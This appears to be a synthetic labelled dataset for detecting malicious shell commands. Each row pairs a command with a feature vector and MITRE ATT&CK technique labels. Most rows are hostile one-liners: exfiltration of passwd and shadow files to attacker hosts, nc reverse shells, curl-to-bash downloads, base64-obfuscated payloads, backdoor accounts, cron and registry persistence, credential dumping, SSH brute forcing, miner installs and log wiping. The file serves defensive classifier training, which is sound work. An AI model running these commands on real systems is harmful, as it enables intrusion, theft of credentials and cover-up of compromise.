sudo net user /add attacker P@ssw0rd,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1136_Create_Account'],synthetic
groups  ;  echo  done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 1, 0]","['T1033_System_Owner_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nmap  -sV  --version-intensity  5  -p  1-65535  10.0.0.1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.28, 0, 0]",['T1046_Network_Service_Scanning'],synthetic
ssh user@192.168.1.10 'ls',"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
ls -la /root /etc /var/www,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1083_File_and_Directory_Discovery'],synthetic
cat /etc/shadow | nc 10.0.0.99 4444,"[1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
sudo wget --post-file=/etc/passwd http://attacker.com/receive && > /dev/null 2>&1,"[0, 1, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.32, 1, 0]","['T1041_Exfiltration_Over_C2_Channel', 'T1059_Command_and_Scripting_Interpreter']",synthetic
w,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.04, 0, 0]",['T1033_System_Owner_Discovery'],synthetic
nohup awk -F: '{print $1}' /etc/passwd | head -5 &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.4, 1, 0]",['BENIGN'],synthetic
echo 'backdoor:x:0:0:root:/root:/bin/bash' >> /etc/passwd && history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 0]","['T1098_Account_Manipulation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'Y3VybCAtcyBodHRwOi8vYzIuYXR0YWNrZXIuY29tL2JlYWNvbg==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1041_Exfiltration_Over_C2_Channel', 'T1027_Obfuscated_Files_or_Information']",synthetic
arp-scan --localnet,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.08, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
sudo (crontab -l; echo '* * * * * /tmp/payload.sh') | crontab -,"[0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.52, 1, 0]",['T1053_Scheduled_Task'],synthetic
echo 'cm91dGUgLW4=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'd2dldCAtcSBodHRwOi8vbWluZXIuY29tL3htcmlnIC1PIC90bXAveG1yICYmIGNobW9kICt4IC90bXAveG1yICYmIC90bXAveG1yIC1vIHBvb2wubWluZXhtci5jb206NDQz' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1496_Resource_Hijacking', 'T1027_Obfuscated_Files_or_Information']",synthetic
wget --post-file=/etc/passwd http://attacker.com/receive,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
echo 'backdoor:x:0:0:root:/root:/bin/bash' >> /etc/passwd,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1098_Account_Manipulation'],synthetic
wmiexec.py  domain/admin:pass@10.0.0.5  &&  >  /dev/null  2>&1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.24, 1, 0]","['T1021_Remote_Services', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"bash -c ""Get-LocalGroupMember -Group Administrators""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
cat /etc/group,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
wget -q http://miner.com/xmrig -O /tmp/xmr && chmod +x /tmp/xmr && /tmp/xmr -o pool.minexmr.com:443,"[0, 1, 1, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.52, 1, 1]",['T1496_Resource_Hijacking'],synthetic
time find / -name '*.conf' -readable 2>/dev/null | head -20,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.4, 1, 0]",['T1083_File_and_Directory_Discovery'],synthetic
echo 'd2dldCAtcSBodHRwOi8vbWluZXIuY29tL3htcmlnIC1PIC90bXAveG1yICYmIGNobW9kICt4IC90bXAveG1yICYmIC90bXAveG1yIC1vIHBvb2wubWluZXhtci5jb206NDQz' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1496_Resource_Hijacking', 'T1027_Obfuscated_Files_or_Information']",synthetic
find /home -name '*.conf',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['BENIGN'],synthetic
"bash -c ""echo 'bHNjcHU=' | base64 -d | bash""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1082_System_Information_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo '@reboot /tmp/.xmr/xmrig -o pool.minexmr.com' | crontab -,"[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1496_Resource_Hijacking'],synthetic
New-ItemProperty -Path 'HKLM:\...' -Name Persist -Value 'C:\payload.exe' | echo done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.4, 1, 0]","['T1112_Modify_Registry', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'eGZyZWVyZHAgL3U6QWRtaW5pc3RyYXRvciAvcDpQYXNzd29yZDEyMyAvdjoxMC4wLjAuNQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1021_Remote_Services', 'T1027_Obfuscated_Files_or_Information']",synthetic
for p in $(cat passwords.txt); do sshpass -p $p ssh root@10.0.0.1 id; done,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.52, 0, 0]",['T1110_Brute_Force'],synthetic
cat /tmp/encoded | xxd -r -p | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.4, 0.32, 1, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
time crontab -l,"[0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
echo 'Y2F0IC9ldGMvbmV0d29yay9pbnRlcmZhY2VzIDsgc2xlZXAgMQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
sh -c 'curl http://evil.com/shell.sh | bash',"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
nohup history -c && history -w &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 0]",['T1070_Indicator_Removal'],synthetic
sh -c 'curl http://evil.com/shell.sh | bash',"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
shred -u /var/log/auth.log ; echo done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 0]","['T1070_Indicator_Removal', 'T1059_Command_and_Scripting_Interpreter']",synthetic
sudo systemctl enable --now malicious.service,"[0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1053_Scheduled_Task'],synthetic
sudo find / -name '*.conf' -readable 2>/dev/null | head -20,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.4, 1, 0]",['T1083_File_and_Directory_Discovery'],synthetic
echo 'c2hyZWQgLXUgL3Zhci9sb2cvYXV0aC5sb2c=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1070_Indicator_Removal', 'T1027_Obfuscated_Files_or_Information']",synthetic
lscpu,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.04, 0, 0]",['T1082_System_Information_Discovery'],synthetic
echo 'Y2F0IC9ldGMvbmV0d29yay9pbnRlcmZhY2Vz' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
time echo 'aXAgcm91dGUgc2hvdyAmJiBzbGVlcCAx' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
"bash -c ""./dirtycow /etc/passwd 'root::0:0:root:/root:/bin/bash' && chmod +x /tmp/payload""","[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.36, 1, 1]","['T1068_Exploitation_for_Privilege_Escalation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo  '*/5  *  *  *  *  curl  http://c2.com/beacon'  |  crontab  -,"[0, 1, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.44, 1, 0]",['T1053_Scheduled_Task'],synthetic
cat /proc/version && chmod +x /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 1]","['T1082_System_Information_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
wget -q https://example.com/file.tar.gz,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
time ln -s /tmp/backdoor.sh /etc/cron.d/system-update,"[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1053_Scheduled_Task'],synthetic
perl -e 'use Socket; ...',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
echo '' > /var/log/syslog,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1070_Indicator_Removal'],synthetic
time xfreerdp /u:Administrator /p:Password123 /v:10.0.0.5,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1021_Remote_Services'],synthetic
route -n,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1016_System_Network_Config_Discovery'],synthetic
sudo curl -s http://c2.attacker.com/beacon,"[0, 1, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
sudo ssh -L 8080:internal:80 user@jump.host,"[0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1021_Remote_Services'],synthetic
time (crontab -l; echo '* * * * * /tmp/payload.sh') | crontab -,"[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.52, 1, 0]",['T1053_Scheduled_Task'],synthetic
"perl -e 'eval pack q/H*/, q/7363726970742e6570732f52656d6f74652e706e67/' && > /dev/null 2>&1","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0.0, 0.4, 1, 0]","['T1027_Obfuscated_Files_or_Information', 'T1059_Command_and_Scripting_Interpreter']",synthetic
sha256sum  /etc/passwd,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['BENIGN'],synthetic
echo 'TmV3LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAnSEtMTTpcLi4uJyAtTmFtZSBQZXJzaXN0IC1WYWx1ZSAnQzpccGF5bG9hZC5leGUn' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1112_Modify_Registry', 'T1027_Obfuscated_Files_or_Information']",synthetic
procdump.exe -ma lsass.exe lsass.dmp ; echo done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 0]","['T1003_OS_Credential_Dumping', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nohup lscpu ; > /dev/null 2>&1 &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.28, 1, 0]","['T1082_System_Information_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nohup masscan -p1-65535 10.0.0.0/24 --rate=1000 &,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.24, 0, 0]",['T1046_Network_Service_Scanning'],synthetic
time ./pwnkit | chmod +x /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 1]","['T1068_Exploitation_for_Privilege_Escalation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
vim /etc/hosts,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['BENIGN'],synthetic
sudo wget http://attacker.com/payload -O /tmp/payload | > /dev/null 2>&1,"[0, 1, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0.2, 0.36, 1, 0]","['T1105_Ingress_Tool_Transfer', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"bash -c ""procdump.exe -ma lsass.exe lsass.dmp ; echo done""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.36, 1, 0]","['T1003_OS_Credential_Dumping', 'T1059_Command_and_Scripting_Interpreter']",synthetic
sudo nmap -sn 192.168.1.0/24,"[1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.16, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
"sudo ldapsearch -x -b 'dc=domain,dc=com' '(objectClass=person)'","[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1087_Account_Discovery'],synthetic
./pwnkit,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.04, 0, 1]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
nc -e /bin/bash attacker.com 80 ; echo done,"[0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 1, 0]","['T1071_Application_Layer_Protocol', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"bash -c ""wget --post-file=/etc/passwd http://attacker.com/receive | > /dev/null 2>&1""","[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.36, 1, 0]","['T1041_Exfiltration_Over_C2_Channel', 'T1059_Command_and_Scripting_Interpreter']",synthetic
time tftp -i 10.0.0.99 GET payload.exe C:\Windows\Temp\payload.exe,"[1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
medusa -h 10.0.0.1 -u root -P /tmp/passwords.txt -M ssh,"[1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.36, 0, 0]",['T1110_Brute_Force'],synthetic
ip link show,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1016_System_Network_Config_Discovery'],synthetic
sudo id -u,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.12, 0, 0]",['T1033_System_Owner_Discovery'],synthetic
"perl  -e  'eval  pack  q/H*/,  q/7363726970742e6570732f52656d6f74652e706e67/'","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
groups $(whoami),"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
curl -sL http://evil.com/shell.sh -o /tmp/shell.sh ; echo done,"[0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 1, 0]","['T1105_Ingress_Tool_Transfer', 'T1059_Command_and_Scripting_Interpreter']",synthetic
for p in $(cat passwords.txt); do sshpass -p $p ssh root@10.0.0.1 id; done,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.52, 0, 0]",['T1110_Brute_Force'],synthetic
sudo getent passwd | grep -v nologin,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.28, 1, 0]",['T1087_Account_Discovery'],synthetic
echo -e '\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68' | echo done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0.2, 0.24, 1, 0]","['T1027_Obfuscated_Files_or_Information', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"bash -c ""nc -zv 10.0.0.1 1-1000 2>&1 | grep succeeded""","[1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.4, 1, 0]",['T1046_Network_Service_Scanning'],synthetic
scp  attacker@10.0.0.99:/tools/linpeas.sh  /tmp/,"[1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
nohup echo 'Li9kaXJ0eWNvdyAvZXRjL3Bhc3N3ZCAncm9vdDo6MDowOnJvb3Q6L3Jvb3Q6L2Jpbi9iYXNoJyB8IGVjaG8gZG9uZQ==' | base64 -d | bash &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1068_Exploitation_for_Privilege_Escalation', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
last -n 10,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1033_System_Owner_Discovery'],synthetic
echo 'bm9odXAgLi94bXJpZyAtLXVybCBzdHJhdHVtK3RjcDovL3Bvb2wubWluZXhtci5jb206NDQzIC0tdXNlciB3YWxsZXQgJg==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1496_Resource_Hijacking', 'T1027_Obfuscated_Files_or_Information']",synthetic
sudo cat /etc/network/interfaces,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1016_System_Network_Config_Discovery'],synthetic
"bash -c ""export LANG=en_US.UTF-8""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['BENIGN'],synthetic
nohup nmap -A -T4 192.168.1.0/24 &,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.24, 0, 0]",['T1046_Network_Service_Scanning'],synthetic
time ncrack -p 22 --user root -P pass.lst 10.0.0.1 | > /dev/null 2>&1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.52, 1, 0]","['T1110_Brute_Force', 'T1059_Command_and_Scripting_Interpreter']",synthetic
wget -q -O- --header='X-Auth: token123' http://evil.com/cmd ; echo done,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.36, 1, 0]","['T1071_Application_Layer_Protocol', 'T1059_Command_and_Scripting_Interpreter']",synthetic
wget -q -O- --header='X-Auth: token123' http://evil.com/cmd && history -c,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.36, 1, 0]","['T1071_Application_Layer_Protocol', 'T1059_Command_and_Scripting_Interpreter']",synthetic
time nc -e /bin/bash attacker.com 80 | sleep 1,"[0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.36, 1, 0]","['T1071_Application_Layer_Protocol', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nbtscan 192.168.1.0/24,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
echo 'd2dldCAtLXBvc3QtZmlsZT0vZXRjL3Bhc3N3ZCBodHRwOi8vYXR0YWNrZXIuY29tL3JlY2VpdmU=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1041_Exfiltration_Over_C2_Channel', 'T1027_Obfuscated_Files_or_Information']",synthetic
net user /add attacker P@ssw0rd,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1136_Create_Account'],synthetic
cat ~/.aws/credentials,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
sudo useradd -m -s /bin/bash -G sudo newadmin,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1098_Account_Manipulation'],synthetic
at now + 1 minute <<< '/tmp/payload',"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1053_Scheduled_Task'],synthetic
echo 'c3UgLSBhZG1pbg==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1078_Valid_Accounts', 'T1027_Obfuscated_Files_or_Information']",synthetic
route -n,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1016_System_Network_Config_Discovery'],synthetic
echo 'ZnBpbmcgLWEgLWcgMTkyLjE2OC4xLjAvMjQgMj4vZGV2L251bGw=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1018_Remote_System_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
"bash -c ""uname -a""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.16, 0, 0]",['T1082_System_Information_Discovery'],synthetic
psexec.py Administrator:password@10.0.0.5 cmd.exe,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1021_Remote_Services'],synthetic
curl -sL http://evil.com/xmrig | bash,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.2, 1, 0]",['T1496_Resource_Hijacking'],synthetic
gcc exploit.c -o exploit && ./exploit,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 0]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
echo 'compromised ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1098_Account_Manipulation'],synthetic
useradd -m -s /bin/bash -G sudo newadmin,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1098_Account_Manipulation'],synthetic
reg  add  HKLM\Software\Microsoft\Windows\CurrentVersion\Run  /v  Backdoor  /d  C:\payload.exe  &&  echo  done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.4, 1, 0]","['T1112_Modify_Registry', 'T1059_Command_and_Scripting_Interpreter']",synthetic
time openssl rand -hex 16,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['BENIGN'],synthetic
nohup for p in $(cat passwords.txt); do sshpass -p $p ssh root@10.0.0.1 id; done &,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.6, 0, 0]",['T1110_Brute_Force'],synthetic
nohup hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.1 &,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1110_Brute_Force'],synthetic
scp attacker@10.0.0.99:/tools/linpeas.sh /tmp/,"[1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
"bash -c ""echo 'TmV3LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAnSEtMTTpcLi4uJyAtTmFtZSBQZXJzaXN0IC1WYWx1ZSAnQzpccGF5bG9hZC5leGUn' | base64 -d | bash""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1112_Modify_Registry', 'T1027_Obfuscated_Files_or_Information']",synthetic
New-ItemProperty -Path 'HKLM:\...' -Name Persist -Value 'C:\payload.exe',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1112_Modify_Registry'],synthetic
ip route show,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1016_System_Network_Config_Discovery'],synthetic
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1110_Brute_Force'],synthetic
"python3 -c 'import socket,subprocess,os;...'","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
fping -a -g 192.168.1.0/24 2>/dev/null,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.2, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
usermod  -aG  sudo  compromised_user  |  sleep  1,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.28, 1, 0]","['T1098_Account_Manipulation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
